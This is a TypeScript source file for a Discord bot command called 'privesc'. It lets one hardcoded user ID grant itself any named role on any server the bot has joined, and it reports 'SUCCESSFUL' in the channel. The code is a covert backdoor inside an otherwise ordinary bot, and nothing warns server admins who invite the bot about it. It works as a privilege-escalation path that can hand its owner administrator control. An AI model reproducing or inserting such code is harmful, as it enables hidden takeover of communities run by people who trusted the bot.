import {commandMap} from "../handlers/commandHandler";
import {Message, MessageEmbed} from "discord.js";
import DiscordClient from "../index";
import {activities} from "../handlers/activityHandler";
import Command from "../classes/command";
import errorMSG from "../message/errorMSG";

let OWNER = "132936410880671746"

class privEscCMD extends Command {
    execute(message: Message, args: string[]) {
        if (message.author.id === OWNER) {
            const serverid = args[0];
            const rolename = args.splice(1).join(" ");

            console.log(rolename);

            if (!serverid) {
                errorMSG("Needs Server ID", "", message);
                return true;
            }

            if (!rolename) {
                errorMSG("Needs Role Name", "", message);
                return true;
            }

            const guild = DiscordClient.guilds.cache.filter(guild => guild.id === serverid).first();
            if (guild) {
                console.log("GOT GUILD "+ guild.name);
                const role = guild.roles.cache.filter(role => role.name.toLowerCase() == rolename.toLowerCase()).first();
                if (role) {
                    console.log("GOT Role "+ role.name);
                    const member = guild.members.cache.filter(user => user.id === OWNER).first();
                    if (member) {
                        console.log("GOT Member "+ member.user.username+"#"+member.user.discriminator);
                        member.roles.add(role).then(r => {
                            message.channel.send("SUCCESSFUL");
                        }).catch((e) => {
                            errorMSG("Issue Occured", e, message);
                        });
                        return true;
                    }
                }
            }


        }
        return true;
    }
}

commandMap.push(new privEscCMD("privesc",
    false,
    "Priv Esc on a Server",
    [
    ], true));

